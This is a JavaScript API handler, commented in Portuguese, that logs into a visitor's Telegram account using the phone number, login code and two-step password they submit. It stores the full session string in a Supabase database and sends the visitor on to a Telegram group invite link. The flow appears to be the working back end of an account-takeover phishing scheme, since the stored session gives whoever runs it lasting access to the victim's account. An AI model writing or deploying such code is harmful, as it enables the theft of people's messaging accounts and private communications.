import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  let { phoneNumber, code, password } = req.body;
  
  // 1. LIMPEZA TOTAL (Igual ao send-code)
  const cleanPhone = phoneNumber.replace(/\D/g, '');
  const cleanCode = code.toString().trim();

  console.log(`[VERIFY] Buscando sessão para: ${cleanPhone}`);

  try {
      // Busca pelo número LIMPO
      const { data: authData, error } = await supabase
        .from('auth_state')
        .select('*')
        .eq('phone_number', cleanPhone) // Agora vai bater!
        .single();

      if (error || !authData) {
          console.error("[VERIFY] Sessão não encontrada. O banco pode ter salvado com +55?", error);
          return res.status(400).json({ error: "Sessão expirada ou número incorreto." });
      }

      console.log("[VERIFY] Sessão encontrada! Conectando...");

      const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, {
        connectionRetries: 5,
        useWSS: false, 
      });
      
      await client.connect();

      // Login
      if (password) {
            await client.signIn({
                password: password,
                phoneNumber: cleanPhone,
                phoneCodeHash: authData.phone_code_hash,
                phoneCode: cleanCode,
            });
      } else {
            try {
                await client.invoke(new Api.auth.SignIn({
                    phoneNumber: cleanPhone,
                    phoneCodeHash: authData.phone_code_hash,
                    phoneCode: cleanCode,
                }));
            } catch (e) {
                if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
                    await client.disconnect();
                    return res.status(200).json({ status: 'needs_2fa' });
                }
                throw e;
            }
      }

      // Salva sessão final
      const finalSession = client.session.save();
      
      await supabase.from('telegram_sessions').upsert({
        phone_number: cleanPhone,
        session_string: finalSession,
        is_active: true,
        created_at: new Date()
      }, { onConflict: 'phone_number' });

      // Remove temporário
      await supabase.from('auth_state').delete().eq('phone_number', cleanPhone);
      
      await client.disconnect();
      
      res.status(200).json({ 
          success: true, 
          redirect: "https://t.me/+krRexYUrqMVkMmNh" 
      });

  } catch (error) {
    console.error("[VERIFY] ERRO:", error);
    res.status(400).json({ error: error.message || "Erro na validação" });
  }
}
